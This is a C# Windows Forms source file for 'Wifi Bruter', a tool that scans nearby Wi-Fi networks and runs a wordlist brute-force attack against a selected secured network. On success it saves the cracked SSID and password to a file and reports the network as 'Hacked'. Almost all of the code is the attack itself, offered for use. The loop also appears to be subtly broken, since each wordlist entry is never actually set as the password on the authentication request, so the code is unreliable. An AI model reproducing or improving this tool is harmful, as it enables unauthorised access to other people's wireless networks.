using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using SimpleWifi;
using System.Threading.Tasks;
using System.IO;
namespace wifi_bruter
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }
        string wordlist = "";
        private void Main_Load(object sender, EventArgs e)
        {
            Wifi o = new Wifi();
            lb.Items.Clear();
            lb.Enabled = true;
            foreach (var item in o.GetAccessPoints())
            {
                lb.Items.Add(item.Name + " (signal " + item.SignalStrength.ToString() + "%)");
                if (item.IsConnected)
                    lb.SelectedItem = item.Name + " (signal " + item.SignalStrength.ToString() + "%)";
            }
            if (lb.Items.Count < 1)
            {
                lb.Items.Clear();
                lb.Items.Add("---No Wifi Available---");
                lb.Enabled = false;
            }

        }
        void refresh()
        {
            Wifi o = new Wifi();
            lb.Items.Clear();
            lb.Enabled = true;


            foreach (var item in o.GetAccessPoints())
            {
                lb.Items.Add(item.Name + " (signal " + item.SignalStrength.ToString() + "%)");
            }
            if (lb.Items.Count < 1)
            {
                lb.Items.Clear();
                lb.Items.Add("---No Wifi Available---");
                lb.Enabled = false;
            }

        }

        private void reff_Click(object sender, EventArgs e)
        {
            refresh();
        }

        private void refreshtimer_Tick(object sender, EventArgs e)
        {
            refresh();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            try
            {
                int o = int.Parse(textBox1.Text);
                if (o < 1000)
                {
                    textBox1.Text = "1000";
                    refreshtimer.Interval = 1000;

                }
                else
                    refreshtimer.Interval = o;
            }
            catch
            {


            }
        }

        private void loadword_Click(object sender, EventArgs e)
        {
            OpenFileDialog op = new OpenFileDialog();
            op.Filter = "*.txt|*.txt|*.*|*.*";
            if (op.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                wordlist = op.FileName;
            }
        }
        bool cancel = false;
        string status = "Status : ";
        private async void brute_Click(object sender, EventArgs e)
        {

            if (brute.Text == "Brute")
            {

                //refresh();
                lockitem();
                brute.Text = "Cancel";
                cancel = false;
                Wifi o = new Wifi();

                AccessPoint wb = null;
                foreach (var item in o.GetAccessPoints())
                {
                    if (item.IsConnected)
                        if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
                        {
                            MessageBox.Show("you can not attack the wifi when you are connected to this...", item.Name);
                            cancel = true;
                            unlockitem();
                            brute.Text = "Brute";
                            return;
                        }
                    if (item.HasProfile)
                        if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
                        {
                            MessageBox.Show("you can not attack the wifi when wifi information has saved on your PC\nPlease Delete this wifi information and try again!", item.Name);
                            cancel = true;
                            unlockitem();
                            brute.Text = "Brute";
                            return;
                        }

                    if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
                        wb = item;

                }
                if (wb == null)
                {
                    cancel = true;
                    unlockitem();
                    brute.Text = "Brute";
                    return;

                }
                o.Disconnect();
                AuthRequest b = new AuthRequest(wb);
                if (wordlist == "")
                {
                    MessageBox.Show("Please Select A Wordlist!");
                    cancel = true;
                    unlockitem();
                    brute.Text = "Brute";
                    return;
                }
                if (!File.Exists(wordlist))
                {
                    MessageBox.Show("Please Select A Vaild Wordlist!");
                    cancel = true;
                    unlockitem();
                    brute.Text = "Brute";
                    return;
                }


                string pp = "";

                if (wb.IsSecure)
                {
                    var count = File.ReadLines(wordlist).Count();
                    double counter=0;
                    using (var f = File.OpenText(wordlist))
                    {
                        
                        while ((pp = f.ReadLine()) != null)
                        {
                            if (cancel)
                                return;
                            counter++;
                            state.Text = status + "Trying " + pp + " ("+counter.ToString()+"/"+count.ToString()+") ...";



                            await Task.Run(() =>
                            {
                                if (wb.Connect(b, true))
                                {
                                    cancel = true;
                                    unlockitem();
                                    brute.Text = "Brute";
                                    File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + wb.Name + ".txt", @"[WiFi Bruter]
Name (SSID)=" + wb.Name + @"
Password=" + pp + @"
//Cracked By Wifi Bruter
//https://github.com/MG-Token
//Coded By Metal Ghost");
                                    MessageBox.Show("Wifi Cracked information saved on:\n" + AppDomain.CurrentDomain.BaseDirectory + wb.Name + ".txt", wb.Name+" Hacked");

                                }
                            });





                        }
                        if (!cancel)
                        {
                            MessageBox.Show("Wifi not Cracked", wb.Name+" not Hacked");

                            cancel = true;
                            unlockitem();
                            brute.Text = "Brute";
                        }
                    }
                }
                else
                {
                    await Task.Run(() =>
                                {
                                    state.Text = status + "Connecting...";
                                    if (wb.Connect(b))
                                        state.Text = status + "Connected to " + wb.Name;
                                    else
                                        state.Text = status + "Can not connect to " + wb.Name;
                                    cancel = true;
                                    unlockitem();
                                    brute.Text = "Brute";
                                });
                }

            }
            else
            {
                cancel = true;
                unlockitem();
                brute.Text = "Brute";

            }
        }
        void lockitem()
        {
            refreshtimer.Enabled = false;
            reff.Enabled = false;
            lb.Enabled = false;
            textBox1.ReadOnly = true;
            loadword.Enabled = false;
            delp.Enabled = false;
        }
        void unlockitem()
        {
            refreshtimer.Enabled = true;
            reff.Enabled = true;
            lb.Enabled = true;
            textBox1.ReadOnly = false;
            loadword.Enabled = true;
            state.Text = status + "idle";
            delp.Enabled = true;
            refresh();

        }

        private void label3_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/MG-Token");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Wifi o = new Wifi();

            AccessPoint wb = null;
            foreach (var item in o.GetAccessPoints())
            {
                if (item.IsConnected)
                    if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
                    {
                        o.Disconnect();
                    }
                if (item.HasProfile)
                    if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
                    {
                        item.DeleteProfile();
                        MessageBox.Show("Profile Deleted");
                    }


            }
        }
    }
}
